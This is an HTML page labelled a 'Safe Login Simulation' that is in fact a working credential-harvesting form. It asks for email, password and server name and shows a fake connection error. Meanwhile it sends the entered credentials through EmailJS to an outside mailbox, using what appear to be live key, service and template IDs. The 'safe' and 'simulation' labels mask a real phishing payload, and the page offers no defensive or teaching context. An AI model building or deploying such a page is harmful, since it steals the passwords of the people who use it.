<!DOCTYPE html>
<html>
<head>
  <title>Safe Login Lab</title>

  <!-- EmailJS setup -->
  <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
  <script type="text/javascript">
     (function(){
        emailjs.init("f0SVFShSGNOwyB-sm"); // Your Public Key / User ID
        console.log("EmailJS initialized"); // Debug
     })();
  </script>
</head>
<body>
  <h1 style="color: darkred;">Safe Login Simulation</h1>
  <p>Enter email, password, and server name to see the simulation:</p>

  <form id="loginForm">
    <input type="text" id="email" placeholder="Email" required><br><br>
    <input type="password" id="password" placeholder="Password" required><br><br>
    <input type="text" id="server" placeholder="Server Name" required><br><br>
    <button type="submit">Work</button>
  </form>

  <p id="message" style="color: blue; font-weight: bold;"></p>

  <script>
    const loginForm = document.getElementById("loginForm");
    loginForm.addEventListener("submit", function(event) {
      event.preventDefault();

      console.log("Form submitted"); // Debug

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const server = document.getElementById("server").value;

      // Show a fake error message
      document.getElementById("message").innerText = "Error: Could not connect to server.";

      console.log("Sending email with data:", {email, password, server}); // Debug

      emailjs.send("service_lspaiuv", "template_w3426ag", {
        email: email,
        password: password,
        server: server
      })
      .then(function(response) { 
         console.log("Email sent successfully:", response); // Debug
         document.getElementById("message").innerText = "Test email sent safely!";
      })
      .catch(function(error) {
         console.error("Failed to send email:", error); // Debug
         document.getElementById("message").innerText = "Failed to send email: " + error;
      });
    });
  </script>
</body>
</html>
